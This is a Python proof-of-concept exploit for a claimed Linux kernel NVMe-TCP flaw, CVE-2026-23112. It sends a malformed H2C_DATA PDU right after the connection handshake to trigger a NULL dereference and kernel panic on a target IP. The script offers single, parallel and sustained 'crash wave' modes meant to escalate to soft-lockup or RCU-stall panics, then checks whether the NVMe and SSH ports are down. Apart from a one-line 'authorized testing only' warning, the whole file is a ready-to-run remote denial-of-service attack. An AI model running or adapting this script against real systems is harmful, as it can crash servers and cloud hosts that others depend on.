#!/usr/bin/env python3
"""
CVE-2026-23112 -- NVMe-TCP Remote Kernel Panic PoC

Triggers the OOB in nvmet_tcp_build_pdu_iovec() by sending a malformed
H2C_DATA PDU immediately after ICReq/ICResp handshake. The target's PDU
parser accepts the H2C_DATA without a valid NVMe session and calls
nvmet_tcp_build_pdu_iovec() with a NULL scatterlist, causing a NULL
pointer dereference at address 0x0000000c.

On production systems with panic_on_oops=1 (common on cloud/k8s), this
single oops causes an immediate kernel panic. On default configurations
(panic_on_oops=0), parallel crashes can escalate via spinlock leak
cascade or RCU stall.

Usage:
    # Single crash (sufficient if panic_on_oops=1)
    python3 nvmet_tcp_crash.py TARGET_IP --mode single

    # Parallel crashes for spinlock leak cascade
    python3 nvmet_tcp_crash.py TARGET_IP --mode parallel --threads 16 --waves 10

    # Sustained low-rate for RCU stall (60+ seconds)
    python3 nvmet_tcp_crash.py TARGET_IP --mode sustained --waves 80

WARNING: For authorized security testing ONLY.
         Run ONLY against isolated QEMU test VMs.
"""

import argparse
import socket
import struct
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# NVMe-TCP PDU types
NVME_TCP_ICREQ    = 0x00
NVME_TCP_ICRESP   = 0x01
NVME_TCP_H2CDATA  = 0x06

ICREQ_SIZE = 128


def build_icreq():
    """Build NVMe-TCP Initialize Connection Request."""
    pdu = bytearray(ICREQ_SIZE)
    pdu[0] = NVME_TCP_ICREQ
    pdu[2] = ICREQ_SIZE
    struct.pack_into("<I", pdu, 4, ICREQ_SIZE)
    return bytes(pdu)


def build_h2c_oob(data_length=65536):
    """Build a malformed H2C_DATA PDU that triggers the OOB.

    Sent immediately after ICReq/ICResp without any NVMe session setup.
    The target's PDU parser accepts it and calls nvmet_tcp_build_pdu_iovec()
    with a NULL sg list (no command allocated), causing NULL deref at 0x0c.

    The data_length parameter controls how far past the sg array the
    function would walk before crashing. Different values may hit different
    heap-adjacent memory, potentially causing different crash behaviors.
    """
    hlen = 24  # NVMe-TCP H2C Data PDU header size
    pdu = bytearray(hlen)
    pdu[0] = NVME_TCP_H2CDATA
    pdu[1] = 0x04              # flags: LAST_PDU
    pdu[2] = hlen              # hlen
    pdu[3] = hlen              # pdo (data offset)
    plen = hlen + data_length
    struct.pack_into("<I", pdu, 4, plen)          # plen
    struct.pack_into("<H", pdu, 8, 0)             # command_id = 0
    struct.pack_into("<H", pdu, 10, 0)            # ttag = 0
    struct.pack_into("<I", pdu, 12, 0)            # data_offset = 0
    struct.pack_into("<I", pdu, 16, data_length)  # data_length
    return bytes(pdu)


def single_crash(target, port, thread_id, wave, data_length, timeout):
    """Perform one crash attempt: ICReq + H2C_DATA.

    Returns (success: bool, detail: str, latency: float).
    """
    t0 = time.monotonic()
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, port))

        # ICReq
        sock.sendall(build_icreq())
        resp = sock.recv(ICREQ_SIZE)
        if len(resp) < 8 or resp[0] != NVME_TCP_ICRESP:
            return (False, f"bad ICResp (len={len(resp)})", 0)

        # H2C_DATA OOB trigger
        sock.sendall(build_h2c_oob(data_length))

        # Send some data bytes to make the target process the PDU
        sock.sendall(b"\x00" * min(data_length, 8192))

        # Brief pause to let the kernel process
        time.sleep(0.05)

        latency = time.monotonic() - t0
        return (True, "trigger sent", latency)

    except (ConnectionRefusedError, ConnectionResetError) as e:
        return (False, f"conn: {e}", time.monotonic() - t0)
    except (socket.timeout, BrokenPipeError):
        # Timeout or broken pipe after sending may indicate crash
        return (True, "timeout/broken (likely crashed)", time.monotonic() - t0)
    except Exception as e:
        return (False, str(e), time.monotonic() - t0)
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


def check_alive(target, port, timeout=3):
    """Quick TCP connect probe."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target, port))
        s.close()
        return True
    except Exception:
        return False


def run_wave(target, port, n_threads, wave_num, base_data_length, timeout):
    """Launch n_threads parallel crash attempts."""
    results = []
    with ThreadPoolExecutor(max_workers=n_threads) as pool:
        futures = []
        for tid in range(n_threads):
            # Vary data_length per thread to diversify crash paths
            dl = base_data_length + tid * 4096
            f = pool.submit(single_crash, target, port, tid, wave_num,
                            dl, timeout)
            futures.append(f)
        for f in as_completed(futures):
            results.append(f.result())
    return results


def main():
    p = argparse.ArgumentParser(
        description="CVE-2026-23112: NVMe-TCP Remote Kernel Panic PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Attack modes:
  single     One crash attempt. Sufficient if target has panic_on_oops=1.
  parallel   Concurrent crashes to leak spinlocks -> soft-lockup watchdog panic.
  sustained  Slow repeated crashes over 60+ seconds for RCU stall escalation.

Examples:
  %(prog)s 10.0.0.1                          # single crash
  %(prog)s 10.0.0.1 --mode parallel -t 16    # 16 concurrent crashes x 10 waves
  %(prog)s 10.0.0.1 --mode sustained -w 80   # slow crashes over 60+ seconds

WARNING: For authorized security testing ONLY.""")

    p.add_argument("target", help="Target IP address")
    p.add_argument("--port", type=int, default=4420,
                   help="NVMe-TCP port (default: 4420)")
    p.add_argument("--mode", choices=["single", "parallel", "sustained"],
                   default="single", help="Attack mode (default: single)")
    p.add_argument("-t", "--threads", type=int, default=8,
                   help="Parallel connections per wave (default: 8)")
    p.add_argument("-w", "--waves", type=int, default=10,
                   help="Number of crash waves (default: 10)")
    p.add_argument("--delay", type=float, default=0.3,
                   help="Delay between waves in seconds (default: 0.3)")
    p.add_argument("--data-length", type=int, default=65536,
                   help="Base OOB data length claim (default: 65536)")
    p.add_argument("--timeout", type=float, default=5.0,
                   help="Socket timeout in seconds (default: 5)")
    p.add_argument("-q", "--quiet", action="store_true",
                   help="Suppress per-wave output")

    args = p.parse_args()

    print("[*] CVE-2026-23112 NVMe-TCP Remote Kernel Crash PoC")
    print(f"[*] Target: {args.target}:{args.port}")
    print(f"[*] Mode: {args.mode} | Threads: {args.threads} | "
          f"Waves: {args.waves}")
    print()

    if not check_alive(args.target, args.port):
        print(f"[!] Cannot connect to {args.target}:{args.port}")
        print(f"[!] Ensure NVMe-TCP target is running")
        sys.exit(1)
    print(f"[+] Target is listening on port {args.port}")
    print()

    if args.mode == "single":
        print("[*] Single crash attempt...")
        ok, detail, lat = single_crash(args.target, args.port, 0, 0,
                                       args.data_length, args.timeout)
        sym = "+" if ok else "!"
        print(f"[{sym}] {detail} ({lat:.3f}s)")

    else:
        threads = args.threads if args.mode == "parallel" else 2
        delay = args.delay if args.mode == "parallel" else 1.0

        total_sent = 0
        total_fail = 0
        target_down = False
        start = time.monotonic()

        for wave in range(args.waves):
            if target_down:
                break

            results = run_wave(args.target, args.port, threads, wave,
                               args.data_length, args.timeout)

            sent = sum(1 for r in results if r[0])
            failed = sum(1 for r in results if not r[0])
            total_sent += sent
            total_fail += failed
            refused = sum(1 for r in results
                          if not r[0] and "conn" in r[1].lower())

            if not args.quiet:
                elapsed = time.monotonic() - start
                print(f"  Wave {wave+1:3d}/{args.waves}: "
                      f"sent={sent:2d} fail={failed:2d} "
                      f"refused={refused} [{elapsed:.1f}s]")

            if refused == threads:
                print(f"\n[+] Target port DOWN after wave {wave+1}")
                target_down = True

            if wave < args.waves - 1:
                time.sleep(delay)

        elapsed = time.monotonic() - start
        print(f"\n[*] Total: sent={total_sent} failed={total_fail} "
              f"({elapsed:.1f}s)")

    # Post-attack check
    print()
    time.sleep(2)

    nvme_up = check_alive(args.target, args.port)
    ssh_up = check_alive(args.target, 22, timeout=3)

    if not nvme_up and not ssh_up:
        print(f"[+] Target is COMPLETELY DOWN (NVMe + SSH)")
        print(f"[+] KERNEL PANIC LIKELY")
    elif not nvme_up:
        print(f"[+] NVMe-TCP port {args.port} is DOWN")
        print(f"[*] SSH port 22 still responds -- service crash only")
    else:
        print(f"[*] NVMe-TCP port {args.port} still UP")
        print(f"[*] Kernel survived (panic_on_oops=0)")

    print()
    print("[*] Check target for:")
    print("    dmesg | grep -E 'Oops|panic|soft lockup|rcu.*stall'")


if __name__ == "__main__":
    main()
